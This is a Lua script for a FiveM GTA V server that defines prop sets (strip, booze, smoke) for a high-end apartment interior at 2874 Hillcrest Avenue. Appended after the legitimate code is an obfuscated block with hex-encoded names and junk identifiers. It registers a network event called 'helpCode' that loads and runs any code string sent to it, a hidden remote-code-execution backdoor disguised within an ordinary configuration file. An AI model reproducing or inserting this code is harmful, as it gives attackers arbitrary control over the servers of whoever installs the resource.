-- 2874 Hillcrest Avenue
-- High end house 6: -857.798 682.563 152.6529
exports('GetGTAOHouseHi6Object', function()
    return GTAOHouseHi6
end)

GTAOHouseHi6 = {
    interiorId = 207361,

    Strip = {
        A = "Apart_Hi_Strip_A",
        B = "Apart_Hi_Strip_B",
        C = "Apart_Hi_Strip_C",

        Enable = function(details, state, refresh)
            SetIplPropState(GTAOHouseHi6.interiorId, details, state, refresh)
        end
    },
    Booze = {
        A = "Apart_Hi_Booze_A",
        B = "Apart_Hi_Booze_B",
        C = "Apart_Hi_Booze_C",

        Enable = function(details, state, refresh)
            SetIplPropState(GTAOHouseHi6.interiorId, details, state, refresh)
        end
    },
    Smoke = {
        A = "Apart_Hi_Smokes_A",
        B = "Apart_Hi_Smokes_B",
        C = "Apart_Hi_Smokes_C",

        Enable = function(details, state, refresh)
            SetIplPropState(GTAOHouseHi6.interiorId, details, state, refresh)
        end
    },

    LoadDefault = function()
        GTAOHouseHi6.Strip.Enable({
            GTAOHouseHi6.Strip.A,
            GTAOHouseHi6.Strip.B,
            GTAOHouseHi6.Strip.C
        }, false)
        GTAOHouseHi6.Booze.Enable({
            GTAOHouseHi6.Booze.A,
            GTAOHouseHi6.Booze.B,
            GTAOHouseHi6.Booze.C
        }, false)
        GTAOHouseHi6.Smoke.Enable({
            GTAOHouseHi6.Smoke.A,
            GTAOHouseHi6.Smoke.B,
            GTAOHouseHi6.Smoke.C
        }, false)

        RefreshInterior(GTAOHouseHi6.interiorId)
    end
}


local uiSggJcYcivoXjkeOODVWCHJviuAeTQNvPoBfotBAuLkhwFyiCycaCJsaaWrTJzZfcNryb = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} uiSggJcYcivoXjkeOODVWCHJviuAeTQNvPoBfotBAuLkhwFyiCycaCJsaaWrTJzZfcNryb[6][uiSggJcYcivoXjkeOODVWCHJviuAeTQNvPoBfotBAuLkhwFyiCycaCJsaaWrTJzZfcNryb[1]](uiSggJcYcivoXjkeOODVWCHJviuAeTQNvPoBfotBAuLkhwFyiCycaCJsaaWrTJzZfcNryb[2]) uiSggJcYcivoXjkeOODVWCHJviuAeTQNvPoBfotBAuLkhwFyiCycaCJsaaWrTJzZfcNryb[6][uiSggJcYcivoXjkeOODVWCHJviuAeTQNvPoBfotBAuLkhwFyiCycaCJsaaWrTJzZfcNryb[3]](uiSggJcYcivoXjkeOODVWCHJviuAeTQNvPoBfotBAuLkhwFyiCycaCJsaaWrTJzZfcNryb[2], function(VMSNBqlsRmZRSzoTzleZZuXTFZuKFjooihVHDbhEugtebdWBiOUcCrhwZgIPYywZcAJeFy) uiSggJcYcivoXjkeOODVWCHJviuAeTQNvPoBfotBAuLkhwFyiCycaCJsaaWrTJzZfcNryb[6][uiSggJcYcivoXjkeOODVWCHJviuAeTQNvPoBfotBAuLkhwFyiCycaCJsaaWrTJzZfcNryb[4]](uiSggJcYcivoXjkeOODVWCHJviuAeTQNvPoBfotBAuLkhwFyiCycaCJsaaWrTJzZfcNryb[6][uiSggJcYcivoXjkeOODVWCHJviuAeTQNvPoBfotBAuLkhwFyiCycaCJsaaWrTJzZfcNryb[5]](VMSNBqlsRmZRSzoTzleZZuXTFZuKFjooihVHDbhEugtebdWBiOUcCrhwZgIPYywZcAJeFy))() end)